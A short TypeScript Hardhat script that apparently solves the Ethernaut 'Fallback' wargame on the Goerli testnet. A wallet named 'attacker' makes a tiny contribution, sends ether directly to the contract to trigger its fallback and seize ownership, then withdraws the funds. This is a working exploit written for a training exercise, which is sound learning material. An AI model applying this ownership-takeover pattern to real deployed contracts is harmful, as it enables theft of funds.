import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const abi = [
    "function contribute() public payable",
    "function getContribution() public view returns (uint)",
    "function withdraw() public"
]

const address = "0xceFe26B51867E25039CB3639f654776aC355CFf5"
const contract = new ethers.Contract(address, abi, provider)

async function main() {
    let tx

    tx = await contract.connect(attacker).contribute({ value: 1 })
    await tx.wait()

    tx = await attacker.sendTransaction({
        to: contract.address,
        value: 1
    })
    await tx.wait()

    tx = await contract.connect(attacker).withdraw()
    await tx.wait()

    console.log("Fallback - got ownership and withdrawn funds");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });